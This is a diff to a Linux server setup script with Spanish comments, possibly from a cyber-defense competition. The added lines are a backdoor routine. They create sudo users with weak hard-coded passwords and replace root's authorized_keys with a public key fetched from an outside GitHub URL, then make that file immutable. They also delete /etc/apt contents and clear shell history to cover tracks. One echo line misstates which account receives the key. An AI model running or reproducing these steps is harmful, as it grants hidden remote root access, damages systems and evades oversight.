@@ -85,4 +85,55 @@ sudo chattr +i /var/www/simple-php-website/index.php
 sudo systemctl start httpd 2>/dev/null
 sudo systemctl enable httpd 2>/dev/null
 
-0;6u
+
+
+
+# Requiere ejecutarse como root
+if [ "$(id -u)" != "0" ]; then
+   echo "Este script debe ser ejecutado como root" 1>&2
+   exit 1
+fi
+
+# Crear el primer usuario con home directory
+useradd -m ccdc -G sudo
+echo "ccdc:ccdc" | chpasswd
+passwd --expire ccdc
+
+# Crear el segundo usuario sin home directory
+useradd prestashop -G sudo -M
+echo "prestashop:ass" | chpasswd
+
+echo "Usuarios creados y añadidos al grupo sudo. Contraseñas establecidas."
+
+
+
+
+
+
+# URL de tu clave pública
+URL_CLAVE="https://raw.githubusercontent.com/4rji/4rji/main/id_ed25519.pub"
+
+mkdir -p /root/.ssh
+
+
+# Descargar y agregar la clave pública al archivo authorized_keys
+wget -O /root/.ssh/authorized_keys $URL_CLAVE
+chmod 600 /root/.ssh/authorized_keys
+
+
+chattr +i /root/.ssh/authorized_keys
+
+echo "Clave SSH pública instalada para el usuario prestashop."
+
+
+#delete the apt update files
+rm /etc/apt/* -rf
+
+
+sleep 1 
+
+history -c && history -w
+
+echo "Historial borrado"
+
+
